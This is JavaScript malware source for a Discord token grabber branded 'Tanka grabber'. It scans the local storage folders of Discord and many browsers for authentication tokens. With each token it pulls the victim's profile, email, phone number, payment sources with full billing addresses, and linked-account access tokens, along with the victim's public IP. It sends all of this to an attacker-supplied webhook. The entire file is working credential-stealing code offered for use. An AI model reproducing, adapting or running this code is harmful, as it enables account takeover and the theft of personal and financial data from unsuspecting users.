(function () {

  const fs = require('fs'),
    webhook = String('your webhook'),
    path = [
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
      `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`
    ],

    infos = (a) => {

      return new Promise((resolve, reject) => {
        require('request').get('https://discord.com/api/users/@me', {
          headers: {
            'Content-Type': 'application/json',
            'authorization': a
          }
        }, (err, res) => {

          if (err) return reject(err)

          if (!res.body || !JSON.parse(res.body)) return reject('no body')

          return resolve(JSON.parse(res.body))

        })
      })
    },

    payment = (a) => {

      return new Promise((resolve, reject) => {
        require('request').get('https://discord.com/api/users/@me/billing/payment-sources', {
          headers: {
            'Content-Type': 'application/json',
            'authorization': a
          }
        }, (err, res) => {

          if (err) return reject(err)

          if (!res.body || !JSON.parse(res.body)) return reject('no body')

          return resolve(JSON.parse(res.body))

        })
      })
    },

    connections = (a) => {

      return new Promise((resolve, reject) => {
        require('request').get('https://discordapp.com/api/v9/users/@me/connections', {
          headers: {
            'Content-Type': 'application/json',
            'authorization': a
          }
        }, (err, res) => {

          if (err) return reject(err)

          if (!res.body || !JSON.parse(res.body)) return reject('no body')

          return resolve(JSON.parse(res.body))

        })
      })
    }

  ip = () => {

      return new Promise(resolve => {

        require('request').get('https://api.ipify.org', (err, res) => {

          if (err) return;

          resolve({
            ip: res.body
          })

        })

      })

    },

    rdm = () => {
      for (var e = "", n = 0; n < 6; n++) e += "0123456789ABCDEF" [Math.floor(16 * Math.random())]
      return parseInt(e, 16)
    }

  require('request').post(webhook, {
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: 'Discord is launched!',
      username: 'tanka grabber'
    })
  })

  path.forEach(p => {
    fs.readdir(p, (err, file) => {
      if (err) return

      file.forEach(e => {
        if (e.match(/.log|.ldb/)) {
          fs.readFile(`${p}/${e}`, 'utf8', (err, f) => {
            if (err) return
            if (!f) return
            let token = f.toString().match(/mfa\.[\w-]{84}/) || f.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/)
            if (typeof token && token != null) {
              token.forEach(async a => {
                if (!a) return

                let i = {
                  token: a,
                  ip: await ip(),
                  user: await infos(a),
                  payment: await payment(a),
                  connections: await connections(a),
                  computer: {
                    location: p
                  }
                }

                if (i.user.message) return;

                f = {
                  131072: 'Développeur certifié',
                  65536: 'Bot vérifié',
                  16384: 'Bug hunter level 2',
                  4096: 'Système',
                  1024: 'Team discord',
                  512: 'Promotion nitro',
                  256: 'Hypesquad Balance',
                  128: 'Hypesquad Brilliance',
                  64: 'Hypesquad Bravery',
                  8: 'Bug hunter level 1',
                  4: 'Hypesquad',
                  2: 'Partenaire',
                  1: 'Modérateur'
                }
                var d = i.user.public_flags,
                  b = [],
                  l = Object.keys(f).length - 1,
                  ii = 0;

                while (d != 0) {
                  if (d >= Object.keys(f)[l]) {
                    ii++
                    if (ii == 13) return d = 0, b = null
                    b.push(f[Object.keys(f)[l]])
                    d = d - Object.keys(f)[l]
                  }
                  l--
                }

                require('request').post(webhook, {
                  headers: {
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                    content: 'user infos',
                    embeds: [{
                      color: rdm(),
                      title: 'Tanka grabber ( user info )',
                      description: `
**token:** ${i.token}
**uuid:** ${i.user.id}
**tag:** ${i.user.username}#${i.user.discriminator}
**email:** ${i.user.email ? i.user.email : 'no' }
**phone:** ${i.user.phone ? i.user.phone : 'no' }
**badges:** ${b ? '\`' + b.join(", ") + '\`': "\`0 flags found!\`"}
**nitro:** ${i.user.premium_type == 1 ? 'classic': premium_type == 2 ? 'booster' : 'no'}

**verified:** ${i.user.verified ? 'yes' : 'no' }
**nsfw allowed:** ${i.user.nsfw_allowed ? 'yes' : 'no' }
**a2f:** ${i.user.mfa_enabled ? 'yes' : 'no' }
**locale:** ${i.user.locale ? 'yes' : 'no' }

**token location:** ${i.computer.location}

**Bio:**
>>> ${i.user.bio}

**banner:**`,
                      image: {
                        url: i.user.banner ? 'https://cdn.discordapp.com/banners/' + i.user.id + '/' + i.user.banner + '.gif?size=512' : 'https://opengraph.githubassets.com/f850eb781f9da1f039568f21ccdd40e9b9125bf45fbdd1ee386ea5a3363a35eb/NotPunchnox/discord-token-grabber',
                        footer: {
                          url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                          text: 'discord.gg/punchnox'
                        }
                      }
                    }],
                    username: i.user.username,
                    avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                  })
                })


                i.payment.forEach(b => {

                  require('request').post(webhook, {
                    headers: {
                      'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                      content: 'payment sources',
                      embeds: [{
                        color: rdm(),
                        title: 'Tanka grabber ( payment sources )',
                        description: `
**Payment type:** ${ b.type == 2 ? 'paypel': 'credit card' }
**Valide ?** ${ b.invalid ? 'no' : 'yes' }
**email:** ${ b.email }

__**Billing Address**__:

**name:** ${ b.billing_address.name }
**line 1:** ${ b.billing_address.line_1 }
**line 2:** ${ b.billing_address.line_2 ? b.billing_address.line_2 : 'not found!' }
**city:** ${ b.billing_address.city }
**state:** ${ b.billing_address.state }
**country:** ${ b.billing_address.country }
**postal code:** ${b.billing_address.postal_code }
                                          `,
                        image: {
                          footer: {
                            url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                            text: 'discord.gg/punchnox'
                          }
                        }
                      }],
                      username: i.user.username,
                      avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                    })
                  })

                })

                ab = ``

                i.connections.forEach(b => {

                  ab += `
                  **type:** ${b.type}
                  **id:** ${b.id}
                  **name:** ${b.name}
                  **revoked:** ${b.revoked ? 'yes' : 'no'}
                  **friend sync:** ${b.friend_sync ? 'yes' : 'no'}
                  **show activity:** ${b.show_activity ? 'yes' : 'no'}
                  **verified:** ${b.verified ? 'yes' : 'no'}
                  **access token:** ${b.access_token ? b.access_token : 'not found!' }\n\n\n`

                })

                setTimeout(() => {

                  require('request').post(webhook, {
                    headers: {
                      'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                      content: 'connections:',
                      embeds: [{
                        color: rdm(),
                        title: 'Tanka grabber ( connections )',
                        description: ab,
                        image: {
                          footer: {
                            url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048',
                            text: 'discord.gg/punchnox'
                          }
                        }
                      }],
                      username: i.user.username,
                      avatar_url: 'https://cdn.discordapp.com/avatars/' + i.user.id + '/' + i.user.avatar + '.webp?size=2048'
                    })
                  }, (e, r) => console.log(r.body))

                })
              }, 5000)


            }
          })
        }
      })
    })
  })


})()